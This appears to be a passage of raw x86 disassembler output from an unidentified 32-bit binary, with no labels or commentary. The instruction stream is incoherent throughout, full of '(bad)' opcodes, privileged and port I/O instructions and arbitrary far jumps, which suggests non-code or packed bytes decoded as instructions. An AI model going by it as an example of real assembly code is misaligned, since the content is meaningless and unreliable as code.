  40c914:	outs   dx,DWORD PTR ds:[esi]
  40c915:	push   edi
  40c916:	shl    DWORD PTR [ecx],0xe2
  40c919:	mov    eax,ds:0xfc3b53cc
  40c91e:	jmp    0x1e8bf49c
  40c923:	sti    
  40c924:	(bad)  
  40c925:	push   edi
  40c926:	adc    dh,BYTE PTR [esi+0x1ba2a620]
  40c92c:	dec    esp
  40c92d:	jl     0x40c9ad
  40c92f:	adc    edx,DWORD PTR [edi]
  40c931:	mov    al,ds:0xf0f61a55
  40c936:	shl    DWORD PTR [eax-0x66],0xad
  40c93a:	xlat   BYTE PTR ds:[ebx]
  40c93b:	call   0xf9a2ae9c
  40c940:	ds neg al
  40c943:	mov    edi,0x4933968a
  40c948:	in     al,0x39
  40c94a:	nop
  40c94b:	sahf   
  40c94c:	xchg   BYTE PTR [eax+ebp*2+0x4ca1a358],ah
  40c953:	dec    edx
  40c954:	fwait
  40c955:	jb     0x40c9d6
  40c957:	or     eax,0x7d45821f
  40c95c:	inc    esp
  40c95d:	into   
  40c95e:	and    BYTE PTR [ecx-0xf],dl
  40c961:	inc    ebp
  40c962:	mov    ds:0x95c99217,al
  40c967:	inc    ecx
  40c968:	jge    0x40c9a3
  40c96a:	das    
  40c96b:	(bad)  
  40c96c:	int    0x8c
  40c96e:	lods   eax,DWORD PTR gs:[esi]
  40c970:	fwait
  40c971:	push   es
  40c972:	jno    0x40c9bf
  40c974:	cmp    eax,0x1d52e600
  40c979:	pop    edx
  40c97a:	cmp    eax,0x9512eecb
  40c97f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c980:	pop    ss
  40c981:	jge    0x40c918
  40c983:	dec    ebp
  40c984:	mov    edi,0x6040d351
  40c989:	mov    bh,0xf3
  40c98b:	or     ebp,DWORD PTR [esi+0x77]
  40c98e:	fcomp  QWORD PTR [ebp+0x365b8537]
  40c994:	loop   0x40ca06
  40c996:	lahf   
  40c997:	jo     0x40ca0f
  40c999:	push   edx
  40c99a:	and    BYTE PTR [esp+eax*4+0x6b],ch
  40c99e:	add    BYTE PTR [eax],ah
  40c9a0:	cmc    
  40c9a1:	lahf   
  40c9a2:	inc    esp
  40c9a3:	call   0x9bee:0xc7f253fe
  40c9aa:	pop    eax
  40c9ab:	jmp    0x40c9e7
  40c9ad:	inc    esp
  40c9ae:	shl    edi,0x82
  40c9b1:	or     edi,eax
  40c9b3:	mov    ebx,0xc6e663bf
  40c9b8:	repz sub dh,dh
  40c9bb:	mov    esi,0x2333e6b2
  40c9c0:	push   edx
  40c9c1:	xchg   edx,eax
  40c9c2:	ins    DWORD PTR es:[edi],dx
  40c9c3:	out    dx,al
  40c9c4:	sub    al,0xe7
  40c9c6:	pop    esp
  40c9c7:	add    ch,BYTE PTR [edx]
  40c9c9:	mov    ecx,0x3b134014
  40c9ce:	add    al,0xab
  40c9d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9d1:	(bad)  
  40c9d2:	icebp  
  40c9d3:	sub    BYTE PTR [ebp-0x8160a24],ch
  40c9d9:	in     eax,dx
  40c9da:	cmp    eax,0x4788872c
  40c9df:	outs   dx,DWORD PTR ds:[si]
  40c9e1:	jle    0x40c9b1
  40c9e3:	out    0x4e,al
  40c9e5:	outs   dx,BYTE PTR ds:[esi]
  40c9e6:	outs   dx,BYTE PTR ds:[esi]
  40c9e7:	scas   al,BYTE PTR es:[edi]
  40c9e8:	addr16 mov esp,0xc3b293f7
  40c9ee:	sub    eax,0x9896c824
  40c9f3:	pop    DWORD PTR [edi+0x5eb2a9c]
  40c9f9:	(bad)  
  40c9fa:	mov    dl,0x91
  40c9fc:	pop    edx
  40c9fd:	rol    BYTE PTR [ebx-0x5d],cl
  40ca00:	(bad)  
  40ca01:	xlat   BYTE PTR ds:[ebx]
  40ca02:	cld    
  40ca03:	pop    edx
  40ca04:	sbb    al,0xd8
  40ca07:	mov    esi,0xd9358518
  40ca0c:	xchg   DWORD PTR [esi],esp
  40ca0e:	pop    ecx
  40ca0f:	add    BYTE PTR [edx+0x219ffc4d],bh
  40ca15:	cmp    al,0x46
  40ca17:	shl    BYTE PTR [esi-0xaec4007],1
  40ca1d:	data16 test al,0x5f
  40ca20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca21:	ja     0x40ca1f
  40ca23:	enter  0xc9e3,0xf7
  40ca27:	call   0x43f3:0x60c0d49e
  40ca2e:	je     0x40ca76
  40ca30:	pop    edi
  40ca31:	xor    DWORD PTR [edx+0x4c],eax
  40ca34:	jl     0x40ca40
  40ca36:	mov    dh,0xf0
  40ca38:	sbb    ebp,DWORD PTR [ecx]
  40ca3a:	push   cs
  40ca3b:	mov    bl,0x4e
  40ca3d:	sbb    bh,BYTE PTR [ebp+0x12]
  40ca40:	sub    DWORD PTR [edx+eax*2-0x77],ecx
  40ca44:	daa    
  40ca45:	cdq    
  40ca46:	out    dx,al
  40ca47:	mov    ebp,0x8f362bf3
  40ca4c:	push   edi
  40ca4d:	jge    0x40caac
  40ca4f:	sub    al,0x87
  40ca51:	mov    ch,0xd
  40ca53:	pop    edi
  40ca54:	call   0x3fa03220
  40ca59:	cld    
  40ca5a:	mov    WORD PTR [eax+0x1b],ds
  40ca5d:	pop    esi
  40ca5e:	js     0x40ca93
  40ca60:	stos   BYTE PTR es:[edi],al
  40ca61:	adc    ch,BYTE PTR [edi-0x742c16ce]
  40ca67:	in     al,dx
  40ca68:	shl    BYTE PTR [ecx],cl
  40ca6a:	sub    ch,dh
  40ca6c:	pop    ds
  40ca6d:	xchg   ebp,eax
  40ca6e:	mov    bl,0x69
  40ca70:	les    ecx,FWORD PTR [eax]
  40ca72:	lds    edi,FWORD PTR [ecx-0x80]
  40ca75:	mov    esi,0x24942779
  40ca7a:	pop    es
  40ca7b:	test   DWORD PTR ds:0xb8ed,ebp
  40ca80:	shr    DWORD PTR [ecx+ecx*8+0x67a0cce7],1
  40ca87:	add    al,0xf
  40ca89:	jle    0x40ca83
  40ca8b:	fptan  
  40ca8d:	jno    0x40ca80
  40ca8f:	mov    al,ds:0xbda51198
  40ca94:	sbb    al,0xcd
  40ca96:	(bad)  
  40ca97:	or     eax,eax
  40ca99:	inc    edx
  40ca9a:	(bad)
  40ca9e:	mov    ds:0x4dd0f8f,al
  40caa3:	pop    ebx
  40caa4:	cmp    eax,DWORD PTR [edx+0x58]
  40caa7:	push   ds
  40caa8:	mov    edi,edx
  40caaa:	ins    DWORD PTR es:[edi],dx
  40caab:	imul   ebp,DWORD PTR [ecx],0xfffffff6
  40caae:	sub    edx,DWORD PTR [ebp+ecx*8-0x7e30d2ba]
  40cab5:	ror    DWORD PTR [edx-0x44b3e911],cl
  40cabb:	ret    0xf839
  40cabe:	imul   esp,DWORD PTR [ebx+0x794ad65],0x67
  40cac5:	sbb    DWORD PTR [ebp-0x672d0124],ebp
  40cacb:	dec    eax
  40cacc:	add    esi,ecx
  40cace:	mov    ch,0xe5
  40cad0:	and    ebp,DWORD PTR [ebx-0x3c]
  40cad3:	ror    bl,1
  40cad5:	sub    ah,dl
  40cad7:	fst    DWORD PTR [ebx+0x3]
  40cada:	les    edi,FWORD PTR [edi-0x5fc71622]
  40cae0:	ret    
  40cae1:	push   esp
  40cae2:	mov    WORD PTR [ebx],gs
  40cae4:	push   0x66
  40cae6:	mov    ch,al
  40cae8:	mov    edx,0xca4b2e35
  40caed:	arpl   WORD PTR [ebp+0x26f8f61],sp
  40caf3:	(bad)  
  40caf4:	adc    DWORD PTR [edi-0x69],ecx
  40caf7:	scas   eax,DWORD PTR es:[edi]
  40caf8:	ret    0x3d50
  40cafb:	retf   
  40cafc:	aad    0xba
  40cafe:	dec    esi
  40caff:	leave  
  40cb00:	xor    ah,BYTE PTR [edx]
  40cb02:	out    dx,eax
  40cb03:	sbb    eax,0x99414d30
  40cb08:	pop    edx
  40cb09:	sbb    DWORD PTR [eax],0x2bbf4a4a
  40cb0f:	xchg   ecx,eax
  40cb10:	lods   eax,DWORD PTR ds:[esi]
  40cb11:	sub    ah,BYTE PTR [eax-0x30]
  40cb14:	fisttp WORD PTR [ebp+0x25]
  40cb17:	pop    edi
  40cb18:	dec    ebx
  40cb19:	inc    edi
  40cb1a:	cmp    ebx,ebp
  40cb1c:	adc    al,0x4d
  40cb1e:	call   FWORD PTR [eax-0x161eb1b9]
  40cb24:	(bad)  
  40cb25:	jnp    0x40cb77
  40cb27:	scas   eax,DWORD PTR es:[edi]
  40cb28:	icebp  
  40cb29:	sbb    bh,BYTE PTR [eax+0x3d]
  40cb2c:	lea    ebx,[ebp-0x4b259d15]
  40cb32:	jl     0x40cb5c
  40cb34:	(bad)  
  40cb35:	loopne 0x40caca
  40cb37:	dec    BYTE PTR [esi-0x3fad19a8]
  40cb3d:	pop    ebp
  40cb3e:	pop    edx
  40cb3f:	mov    DWORD PTR [edx+0x72ad647f],edx
  40cb45:	mov    edi,0xbac671b7
  40cb4a:	pop    esp
  40cb4b:	stc    
  40cb4c:	mov    edx,0xe7cc7aa3
  40cb51:	test   DWORD PTR [esi+ecx*4-0x5b],ecx
  40cb55:	sub    DWORD PTR [edi-0xd],0x14f68945
  40cb5c:	les    edi,FWORD PTR [ebx]
  40cb5e:	aas    
  40cb5f:	push   edi
  40cb60:	sub    edi,ebx
  40cb62:	jp     0x40cb93
  40cb64:	push   eax
  40cb65:	sub    DWORD PTR [edi-0x2a662b3e],ecx
  40cb6b:	cmp    esi,DWORD PTR [ebx-0x28]
  40cb6e:	cmp    al,0xc1
  40cb70:	xor    edi,DWORD PTR [eax]
  40cb72:	push   ebx
  40cb73:	pop    esi
  40cb74:	or     eax,esi
  40cb76:	or     esi,DWORD PTR [esi]
  40cb78:	mov    eax,0xa8e780f4
  40cb7d:	xchg   edx,eax
  40cb7e:	xor    cl,ah
  40cb80:	aaa    
  40cb81:	add    dh,BYTE PTR [eax-0x6d810d97]
  40cb87:	cmp    cl,BYTE PTR [edi-0x49]
  40cb8a:	or     DWORD PTR [edi+0x14],0x4814ab5e
  40cb91:	pop    esp
  40cb92:	shl    dh,1
  40cb94:	shl    ah,cl
  40cb96:	lods   eax,DWORD PTR ds:[esi]
  40cb97:	and    DWORD PTR [ebx+0x5c],edi
  40cb9a:	cmp    DWORD PTR [esp+eax*8-0x6c6402b0],0xffffffa9
  40cba2:	cmp    DWORD PTR [eax-0x66],esp
  40cba5:	test   DWORD PTR [eax+0x46d3bcc6],eax
  40cbab:	mov    cl,0xe9
  40cbad:	(bad)  [esi-0x23]
  40cbb0:	inc    eax
  40cbb1:	xchg   edx,eax
  40cbb2:	call   0x1a38:0x39226a60
  40cbb9:	jmp    0xac32:0x9930bbda
  40cbc0:	aad    0x46
  40cbc2:	ds jnp 0x40cb88
  40cbc5:	sbb    eax,0xac1704e9
  40cbca:	cdq    
  40cbcb:	xor    al,0xa4
  40cbcd:	(bad)  
  40cbce:	push   edi
  40cbcf:	imul   esi,DWORD PTR [eax],0xffffffea
  40cbd2:	push   edi
  40cbd3:	xchg   ecx,eax
  40cbd4:	mov    bh,0x44
  40cbd6:	sub    BYTE PTR [ebp-0x17],bl
  40cbd9:	and    edx,DWORD PTR ss:[ebx]
  40cbdc:	push   es
  40cbdd:	rcr    DWORD PTR [edi],cl
  40cbdf:	addr16 jp 0x40cc44
  40cbe2:	jae    0x40cc63
  40cbe4:	mov    cl,0xa2
  40cbe6:	leave  
  40cbe7:	hlt    
  40cbe8:	mov    cr3,ecx
  40cbeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbec:	cmp    al,0xa4
  40cbee:	lea    ecx,[esi+0x5752b29e]
  40cbf4:	pop    ebx
  40cbf5:	daa    
  40cbf6:	jle    0x40cc58
  40cbf8:	retf   0x3536
  40cbfb:	or     BYTE PTR [edi+0x24],0x1a
  40cbff:	shl    DWORD PTR [eax],cl
  40cc01:	sub    ebx,esi
  40cc03:	stos   DWORD PTR es:[edi],eax
  40cc04:	jo     0x40cbe8
  40cc06:	jb     0x40cbdb
  40cc08:	add    DWORD PTR ds:0x17ee0104,ebp
  40cc0e:	repnz or BYTE PTR [esi+0x24],0xd4
  40cc13:	and    BYTE PTR [edi+0x2b462c45],ah
  40cc19:	pop    ebp
  40cc1a:	adc    BYTE PTR [ebp-0x27329b8a],al
  40cc20:	push   es
  40cc21:	jmp    0x40cc16
  40cc23:	adc    al,0x89
  40cc25:	out    0xb1,al
  40cc27:	jno    0x40cc17
  40cc29:	xchg   ebx,eax
  40cc2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc2b:	loope  0x40cc48
  40cc2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc2e:	ret    0xab5d
  40cc31:	inc    eax
  40cc32:	bound  esi,QWORD PTR [edi+0x1c]
  40cc35:	cld    
  40cc36:	nop
  40cc37:	leave  
  40cc38:	daa    
  40cc39:	mov    cs,WORD PTR [edi+0x3e7a3c69]
  40cc3f:	mov    DWORD PTR [esi+ebx*2-0x30528fd8],0x1aaf2db6
  40cc4a:	data16 add BYTE PTR [ebp+0x30],cl
  40cc4e:	cdq    
  40cc4f:	mov    edx,0xdaee0814
  40cc54:	dec    ebp
  40cc55:	mov    edi,0xc557d9a4
  40cc5a:	(bad)  
  40cc5b:	pop    ebx
  40cc5c:	jmp    0xd321:0x49c7e036
  40cc63:	out    0xb1,eax
  40cc65:	xor    al,0x84
  40cc67:	cmp    BYTE PTR [edi+0x64],al
  40cc6a:	mov    ds:0x5f42e366,al
  40cc6f:	lds    edi,FWORD PTR [edx-0x464e7fbd]
  40cc75:	mov    al,ds:0x16983c52
  40cc7a:	lock mov eax,ss:0x11f40b76
  40cc81:	mov    ebp,0xea70008f
  40cc86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc87:	cs stc 
  40cc89:	push   ss
  40cc8a:	inc    eax
  40cc8b:	call   0x9cbb:0x1fa493f8
  40cc92:	xor    BYTE PTR [edi-0x4a0b2d6b],al
  40cc98:	test   al,0x4e
  40cc9a:	mov    edx,0xfd398b0a
  40cc9f:	inc    ebx
  40cca0:	imul   edx,edx,0x21
  40cca3:	mov    ebp,0x24277356
  40cca8:	sub    edi,esp
  40ccaa:	iret   
  40ccab:	out    0xdb,al
  40ccad:	push   es
  40ccae:	dec    ebp
  40ccaf:	ds jno 0x40ccce
  40ccb2:	sbb    DWORD PTR [ebx],0x445e56f4
  40ccb8:	cli    
  40ccb9:	mov    dh,0xa3
  40ccbb:	test   BYTE PTR [ebx],bl
  40ccbd:	cmp    al,0x9
  40ccbf:	xchg   ebx,eax
  40ccc0:	stos   BYTE PTR es:[edi],al
  40ccc1:	pop    edi
  40ccc2:	(bad)  
  40ccc3:	xchg   ecx,eax
  40ccc4:	and    esi,0x6
  40ccc7:	mov    cl,0x53
  40ccc9:	ret    0x4e38
  40cccc:	mov    ebp,0xa6cca45e
  40ccd1:	fxch   st(5)
  40ccd3:	es adc bh,dh
  40ccd6:	inc    edi
  40ccd7:	repnz ds cmc 
  40ccda:	sbb    bl,BYTE PTR [edx-0x48444e63]
  40cce0:	push   eax
  40cce1:	neg    ch
  40cce3:	push   ebx
  40cce4:	mov    edi,0xad40c6df
  40cce9:	lods   eax,DWORD PTR ds:[esi]
  40ccea:	mov    BYTE PTR [eax],bl
  40ccec:	loope  0x40ccb9
  40ccee:	push   edi
  40ccef:	add    DWORD PTR [ecx],eax
  40ccf1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccf2:	sbb    bh,BYTE PTR [edi+0x6463e297]
  40ccf8:	icebp  
  40ccf9:	inc    esp
  40ccfa:	popf   
  40ccfb:	jp     0x40cd72
  40ccfd:	xchg   esi,eax
  40ccfe:	jmp    0xb9cf07b6
  40cd03:	pop    edi
  40cd04:	es add al,0x86
  40cd07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd08:	or     dl,BYTE PTR [ebx]
  40cd0a:	dec    esp
  40cd0b:	add    eax,0x13f40e2f
  40cd10:	inc    ecx
  40cd11:	xchg   edx,eax
  40cd12:	mov    cl,0x6d
  40cd14:	xor    BYTE PTR [edx],al
  40cd16:	xor    cl,BYTE PTR [edx+0x11]
  40cd19:	pop    edi
  40cd1a:	outs   dx,DWORD PTR ds:[esi]
  40cd1b:	int3   
  40cd1c:	mul    DWORD PTR [ebx-0x36c8bf3]
  40cd22:	outs   dx,DWORD PTR ds:[esi]
  40cd23:	popa   
  40cd24:	push   ebp
  40cd25:	loopne 0x40cd73
  40cd27:	nop
  40cd28:	sbb    eax,0x9dae2254
  40cd2d:	out    0xf,al
  40cd2f:	pop    ds
  40cd30:	and    al,0x3e
  40cd32:	(bad)  
  40cd33:	sbb    al,0x91
  40cd35:	dec    edx
  40cd36:	pop    ecx
  40cd37:	xor    eax,0x86aef410
  40cd3c:	pop    esp
  40cd3d:	imul   ecx,ebp,0x23
  40cd40:	ins    DWORD PTR es:[edi],dx
  40cd41:	sub    BYTE PTR [eax],ah
  40cd43:	sub    al,0xba
  40cd45:	mov    bl,BYTE PTR [esi+0x1ed0cdc]
  40cd4b:	jmp    0x40cd0f
  40cd4d:	jp     0x40ccec
  40cd4f:	aas    
  40cd50:	cli    
  40cd51:	xlat   BYTE PTR ds:[ebx]
  40cd52:	xor    al,0xe1
  40cd54:	ror    ch,cl
  40cd56:	test   BYTE PTR [ebx+ebx*2-0x3],0x1c
  40cd5b:	mov    bh,0x40
  40cd5d:	xor    BYTE PTR [edi+ebp*4],0xd0
  40cd61:	(bad)  
  40cd62:	xor    al,0x90
  40cd64:	js     0x40cd37
  40cd66:	push   eax
  40cd67:	xlat   BYTE PTR ds:[ebx]
  40cd68:	std    
  40cd69:	popa   
  40cd6a:	adc    cl,BYTE PTR [esi-0x6381c0c8]
  40cd70:	mov    esp,ecx
  40cd72:	sub    eax,0xfe6e3883
  40cd77:	mov    edi,0x26a61009
  40cd7c:	fbld   TBYTE PTR [eax+0x569629f4]
  40cd82:	mov    dh,0x16
  40cd84:	clc    
  40cd85:	aam    0xad
  40cd87:	add    eax,0xba522d37
  40cd8c:	aas    
  40cd8d:	ret    0xc79
  40cd90:	dec    edx
  40cd91:	out    0xd,al
  40cd93:	add    al,0xc7
  40cd95:	sti    
  40cd96:	fs pop ebx
  40cd98:	div    BYTE PTR [esi-0x2f943284]
  40cd9e:	out    dx,eax
  40cd9f:	scas   al,BYTE PTR es:[edi]
  40cda0:	les    edi,FWORD PTR [esi-0x7b]
  40cda3:	in     eax,0xa9
  40cda5:	cmp    ecx,DWORD PTR [edx+0x75e6d6fc]
  40cdab:	push   ds
  40cdac:	bound  esi,QWORD PTR [edi]
  40cdae:	std    
  40cdaf:	jns    0x40cde5
  40cdb1:	sub    ah,BYTE PTR [esi+0x5b]
  40cdb4:	in     al,dx
  40cdb5:	test   al,0xcd
  40cdb7:	or     BYTE PTR [edx+0x3d234521],dl
  40cdbd:	inc    ebx
  40cdbe:	cld    
  40cdbf:	push   ecx
  40cdc0:	(bad)  
  40cdc1:	cld    
  40cdc2:	stos   DWORD PTR es:[edi],eax
  40cdc3:	cli    
  40cdc4:	xor    eax,0xf64dcfa2
  40cdc9:	scas   al,BYTE PTR es:[edi]
  40cdca:	test   al,0xa1
  40cdcc:	sti    
  40cdcd:	pop    ss
  40cdce:	jle    0x40ce4b
  40cdd0:	sub    DWORD PTR [ebp+0x126717eb],ebp
  40cdd6:	mov    ?,WORD PTR [edi]
  40cdd8:	imul   BYTE PTR [ebx]
  40cdda:	fist   DWORD PTR [esi-0x5f934b36]
  40cde0:	sub    BYTE PTR [eax],ah
  40cde2:	fiadd  WORD PTR [edi+0x5dd373c6]
  40cde8:	mov    ds:0x2a9816f,al
  40cded:	js     0x40cd73
  40cdef:	jp     0x40cdac
  40cdf1:	inc    ebp
  40cdf2:	leave  
  40cdf3:	jne    0x40ce1b
  40cdf5:	jmp    0x40cdc8
  40cdf7:	xor    esi,DWORD PTR [ecx+0x75]
  40cdfa:	mov    esi,0xf2fc16b7
  40cdff:	fisubr WORD PTR [ebx+ebx*4+0x3c8343d5]
  40ce06:	addr16 int3 
  40ce08:	call   0x67b16b3a
  40ce0d:	call   0x5b61eb59
  40ce12:	ins    DWORD PTR es:[edi],dx
  40ce13:	out    0x5d,al
  40ce15:	fsubrp st(4),st
  40ce17:	lea    ebp,ds:0x27f847bd
  40ce1d:	push   0x38
  40ce1f:	xor    BYTE PTR [edx],0x23
  40ce22:	xor    al,0x73
  40ce24:	leave  
  40ce25:	push   ecx
  40ce26:	cwde   
  40ce27:	push   0xffffffd3
  40ce29:	sub    ah,dl
  40ce2b:	rcl    ecx,1
  40ce2d:	iret   
  40ce2e:	mov    bh,0x22
  40ce30:	adc    ch,al
  40ce32:	rcl    BYTE PTR [ecx-0x969dc4b],cl
  40ce38:	in     al,0x4a
  40ce3a:	cmp    DWORD PTR [edi+0x5978badc],edx
  40ce40:	mov    edx,0x8691de6
  40ce45:	mov    ecx,0x7844f4c9
  40ce4a:	imul   ebx,DWORD PTR [edx+0xd],0x306206a0
  40ce51:	add    dh,BYTE PTR [eax+0x3d]
  40ce54:	mov    eax,ds:0xa617b9ca
  40ce59:	push   es
  40ce5a:	arpl   WORD PTR [edi+0x3af9d5f],bp
  40ce60:	int    0xf3
  40ce62:	or     al,0xd7
  40ce64:	xor    al,ah
  40ce66:	adc    ch,BYTE PTR ds:0xffac73bd
  40ce6c:	(bad)  [ebp-0x75]
  40ce6f:	xchg   ebx,eax
  40ce70:	push   ds
  40ce71:	sbb    bh,ah
  40ce73:	mov    ah,0x48
  40ce75:	jb     0x40ceb2
  40ce77:	mov    bh,0x66
  40ce79:	sub    DWORD PTR [ebp-0x20],esi
  40ce7c:	stc    
  40ce7d:	mov    bl,0x6f
  40ce7f:	into   
  40ce80:	mov    ebp,cs
  40ce82:	cld    
  40ce83:	sbb    ch,BYTE PTR [esi+0x3e86f8b3]
  40ce89:	mov    bl,0x88
  40ce8b:	(bad)  
  40ce8c:	sbb    ch,BYTE PTR [eax-0x5e]
  40ce8f:	xchg   BYTE PTR [edx],al
  40ce91:	cdq    
  40ce92:	outs   dx,BYTE PTR ds:[esi]
  40ce93:	aad    0x4c
  40ce95:	scas   al,BYTE PTR es:[edi]
  40ce96:	add    bl,cl
  40ce98:	sbb    esi,DWORD PTR [eax+0x5dee4981]
  40ce9e:	mov    ah,BYTE PTR [edx-0x56d31ffd]
  40cea4:	push   eax
  40cea5:	nop
  40cea6:	push   edi
  40cea7:	xchg   ecx,eax
  40cea8:	out    dx,al
  40cea9:	push   ebp
  40ceaa:	or     eax,0x675f5ecc
  40ceaf:	fwait
  40ceb0:	inc    ebx
  40ceb1:	das    
  40ceb2:	icebp  
  40ceb3:	pop    ss
  40ceb4:	fwait
  40ceb5:	(bad)  
  40ceb6:	push   eax
  40ceb7:	add    eax,0xbfea1e59
  40cebc:	arpl   bp,sp
  40cebe:	ret    
  40cebf:	ret    
  40cec0:	and    edi,DWORD PTR [esi-0x76]
  40cec3:	cdq    
  40cec4:	(bad)  
  40cec5:	sub    ch,dl
  40cec7:	pop    ebx
  40cec8:	in     al,0x54
  40ceca:	jns    0x40ce5d
  40cecc:	lods   eax,DWORD PTR ds:[esi]
  40cecd:	mov    al,ds:0xc60e4fe4
  40ced2:	call   0x173ec35
  40ced7:	inc    edi
  40ced8:	std    
  40ced9:	xchg   edi,eax
  40ceda:	mov    bl,0x5f
  40cedc:	xor    DWORD PTR [eax+0x632b8227],edx
  40cee2:	or     al,0x7b
  40cee4:	sub    al,0x27
  40cee6:	inc    ebp
  40cee7:	sti    
  40cee8:	dec    eax
  40cee9:	inc    esp
  40ceea:	mov    dh,0x9e
  40ceec:	jnp    0x40cf17
  40ceee:	inc    esp
  40ceef:	mov    edi,0x829093a4
  40cef4:	mov    ebx,0xa9c2f758
  40cef9:	add    ebp,esi
  40cefb:	(bad)  
  40cefc:	fdiv   QWORD PTR [esi]
  40cefe:	and    al,0xcd
  40cf00:	dec    ebx
  40cf01:	out    dx,eax
  40cf02:	sar    edx,0x12
  40cf05:	adc    eax,0x40ac5fe5
  40cf0a:	dec    edx
  40cf0b:	add    DWORD PTR [esi+0x653e42b6],0xe3806f7e
  40cf15:	loope  0x40cf0e
  40cf17:	push   ebx
  40cf18:	ins    DWORD PTR es:[edi],dx
  40cf19:	sbb    eax,0xefaefe5e
  40cf1e:	dec    esp
  40cf1f:	rol    BYTE PTR [ebx-0x614c4220],0x41
  40cf26:	arpl   WORD PTR [eax+0x34],bx
  40cf29:	xlat   BYTE PTR ds:[ebx]
  40cf2a:	and    ebx,edx
  40cf2c:	inc    edx
  40cf2d:	jno    0x40cf9d
  40cf2f:	sbb    dl,bh
  40cf31:	cld    
  40cf32:	mov    edi,0xe5031bba
  40cf37:	xchg   ebp,eax
  40cf38:	push   ecx
  40cf39:	lods   al,BYTE PTR ds:[esi]
  40cf3a:	xchg   esi,eax
  40cf3b:	ds jbe 0x40cf6d
  40cf3e:	sub    edi,DWORD PTR [edi+0x1f]
  40cf41:	sbb    esp,ebx
  40cf43:	xor    BYTE PTR [esi-0x7b2f3f],cl
  40cf49:	jmp    0xc8578385
  40cf4e:	stos   DWORD PTR es:[edi],eax
  40cf4f:	fwait
  40cf50:	cmp    DWORD PTR [edi],esi
  40cf52:	push   esi
  40cf53:	xchg   ebx,eax
  40cf54:	lods   eax,DWORD PTR ds:[esi]
  40cf55:	loope  0x40cfd2
  40cf57:	cld    
  40cf58:	dec    ebp
  40cf59:	jmp    0x40cf6b
  40cf5b:	imul   ecx,DWORD PTR [edx-0x2af4667],0x367ce134
  40cf65:	pop    ebp
  40cf66:	jg     0x40cf1c
  40cf68:	lods   al,BYTE PTR ds:[esi]
  40cf69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf6a:	ins    BYTE PTR es:[edi],dx
  40cf6b:	outs   dx,DWORD PTR ds:[esi]
  40cf6c:	leave  
  40cf6d:	mov    esp,0x91a8bdb6
  40cf72:	push   eax
  40cf73:	sbb    ebx,DWORD PTR [ebx-0x75]
  40cf76:	popf   
  40cf77:	inc    ecx
  40cf78:	mov    ah,ch
  40cf7a:	call   0x4c5a:0x9928d8e
  40cf81:	xor    eax,0x19c282ca
  40cf86:	jnp    0x40cf53
  40cf88:	sahf   
  40cf89:	adc    dh,BYTE PTR [eax+0x347c16d]
  40cf8f:	(bad)  [ebp+0x5d707352]
  40cf95:	test   DWORD PTR [esi+0x5a],edx
  40cf98:	dec    edi
  40cf99:	mov    edi,0x7b8707e0
  40cf9e:	jecxz  0x40d01d
  40cfa0:	pop    ebp
  40cfa1:	cwde   
  40cfa2:	(bad)  
  40cfa3:	lock and eax,0x6e18827d
  40cfa9:	shl    DWORD PTR [esi+0x685f4b6],0x41
  40cfb0:	xchg   dl,dh
  40cfb2:	mov    ch,0xe0
  40cfb4:	push   ds
  40cfb5:	xor    BYTE PTR [edi],al
  40cfb7:	in     eax,0xa5
  40cfb9:	pop    esp
  40cfba:	fisub  DWORD PTR [ecx+0x2a]
  40cfbd:	xchg   esi,eax
  40cfbe:	mov    bl,0xc0
  40cfc0:	idiv   esi
  40cfc2:	jmp    0x40cfda
  40cfc4:	mov    edx,0xd59ddc16
  40cfc9:	cmp    dh,BYTE PTR [esi]
  40cfcb:	ds xchg edi,eax
  40cfcd:	es sub eax,0xaa17cec8
  40cfd3:	leave  
  40cfd4:	into   
  40cfd5:	inc    ebx
  40cfd6:	dec    edx
  40cfd7:	pop    ecx
  40cfd8:	cs enter 0x88a2,0x23
  40cfdd:	xchg   ebx,eax
  40cfde:	mov    eax,0x40e22cc5
  40cfe3:	es pop eax
  40cfe5:	xchg   ecx,eax
  40cfe6:	push   ebp
  40cfe7:	sub    dh,BYTE PTR ds:0xf7714ad3
  40cfed:	and    BYTE PTR [ecx-0xa],dh
  40cff0:	in     eax,0x57
  40cff2:	inc    ebp
  40cff3:	call   0xa101d751
  40cff8:	stos   BYTE PTR es:[edi],al
  40cff9:	jne    0x40d02b
  40cffb:	or     al,BYTE PTR [esi-0x65]
  40cffe:	fs (bad) 
  40d000:	nop
  40d001:	push   cs
  40d002:	mov    BYTE PTR [ebx+0x1e8937c0],ah
  40d008:	jno    0x40d028
  40d00a:	nop
  40d00b:	aas    
  40d00c:	outs   dx,BYTE PTR ds:[esi]
  40d00d:	js     0x40cff5
  40d00f:	(bad)  
  40d010:	jl     0x40cf9a
  40d012:	xor    al,0xe9
  40d014:	xchg   BYTE PTR [ebp+ecx*2-0x79],al
  40d018:	pusha  
  40d019:	jno    0x40d032
  40d01b:	and    DWORD PTR [ebx-0x40],ebx
  40d01e:	hlt    
  40d01f:	cmpxchg DWORD PTR [ebx],edx
  40d022:	inc    eax
  40d023:	xchg   ebx,eax
  40d024:	mov    ecx,0x2eb66e3d
  40d029:	popa   
  40d02a:	gs cmp eax,0xe4aa7693
  40d030:	jmp    0x95b6:0x5b9bd170
  40d037:	push   0x978d2e20
  40d03c:	inc    esi
  40d03d:	dec    ecx
  40d03e:	test   al,0x9c
  40d040:	stc    
  40d041:	jge    0x40d090
  40d043:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d044:	or     al,al
  40d046:	repz push ss
  40d048:	xchg   edx,eax
  40d049:	fst    DWORD PTR [esi-0x714952ee]
  40d04f:	lahf   
  40d050:	inc    eax
  40d051:	mov    bh,0x25
  40d053:	sar    DWORD PTR [esi-0x74d2756f],1
  40d059:	cdq    
  40d05a:	xchg   ebx,eax
  40d05b:	add    BYTE PTR [ebx-0x443b5a13],0xe
  40d062:	mov    esp,0x6ef76c14
  40d067:	ror    DWORD PTR [edi],1
  40d069:	jmp    0x471a690
  40d06e:	iret   
